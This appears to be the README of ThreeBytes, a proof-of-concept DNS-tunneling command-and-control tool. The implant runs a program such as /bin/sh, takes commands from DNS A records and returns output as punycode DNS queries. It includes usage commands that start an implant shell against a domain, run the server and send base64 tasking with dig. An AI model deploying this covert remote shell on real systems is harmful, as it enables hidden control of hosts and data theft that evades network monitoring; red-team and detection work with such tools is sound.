ThreeBytes
==========
A simple, poorly-documented DNS tunneling PoC which sends tasking as three
bytes of an A record (to leave the firt byte free to get around GeoIP blocking)
and receives responses as punycode labels.

The same binary is used for implant, server, and log filter.

For legal use only.

Implant
-------
Give it an Implant ID, domain, and some program to run.  Example:

```bash
./threebytes -id kittens -domain example.com /bin/sh
```

C2
--
First off, for anybody who actually has to use this, I'm sorry.

The C2 server is ready to go out of the box.  It writes general log data
to stderr, but payload returned from implants to stdout.  As a convenience,
the `-log-filter` flag can be used to filter an implant's stdout/stderr from
a log stream.

```bash
nohup ./threebytes >log 2>info &
tail -f log | ./threebytes -log-filter kittens
```

It's quirky.

Tasking
-------
Tasking is done via a DNS query to a subdomain of `.tasking`.  The leftmost
label should be the implant ID and the second label from the left should be
unpadded base64-encoded tasking, less the `=`'s.  In practice, this looks
something like
```bash
while read line; do dig @localhost kittens.$(echo $line | base64 -e | tr -d '=').tasking; done
```
Note that no null bytes can be sent as tasking.

Protocol
--------
Tasking is in the form of the non-0 bytes of an A record.  It's fed to the
stdin of the implant's command.

Each output byte from the implant is first shifted to a Unicode range well
above ascii, Punycoded, then sent as a query to the server.  The server just
logs it.
